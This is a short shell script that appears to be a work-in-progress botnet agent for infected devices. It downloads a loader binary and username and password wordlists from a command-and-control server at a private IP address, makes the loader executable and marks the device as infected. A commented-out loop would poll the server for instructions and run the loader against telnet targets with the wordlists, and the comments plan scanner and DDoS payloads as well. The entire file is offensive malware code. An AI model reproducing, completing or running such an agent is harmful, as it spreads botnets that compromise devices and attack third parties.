#!/bin/sh

# this is my attempt at a super lightweight agent that doesn't need C binaries or python interpreter and dependencies

# i thought of the following structure: upon getting the credentials to a device, curl ALL of the payloads necessary: scanner, ddoser, 
# loader, whatever. then this agent simply periodically queries for the instruction on the server, executes it and reports back.
INFECTED=/tmp/infected
ID=$(cat dev_id)
if [ ! -e $INFECTED ]; then
	echo 'fetching payloads'
	curl http://172.18.0.1:8000/payload/loader?device_id="$ID" -o loader # i'm gonna get rid of this device id later, or make it some unique thing like the mac
	curl http://172.18.0.1:8000/wordlist/users?device_id="$ID" -o users.txt
	curl http://172.18.0.1:8000/wordlist/passwords?device_id="$ID" -o passwords.txt
	# curl other necessary payloads...

	chmod +x loader
	touch /tmp/infected # signal this device as infected with all the payloads
fi

# while true; do # TODO: fix inside of loop
#	curl -f http://172.18.0.1:8001/inst -o inst
#	INSTRUCTION=$(cat inst)
#	case $INSTRUCTION in
#		Load)
#			curl -X POST http://172.18.0.1:8001/status # something like this to let the control know we are executing
#			curl http://172.18.0.1:8001/target -o target # realistically the target will be in the inst, and we will regex the inst
#			./loader $(cat target) 23 users.txt passwords.txt 20 # the loader will be modified to report back soon
#			;;
#		*) # other instructions
#			;;
#	sleep 30
#done
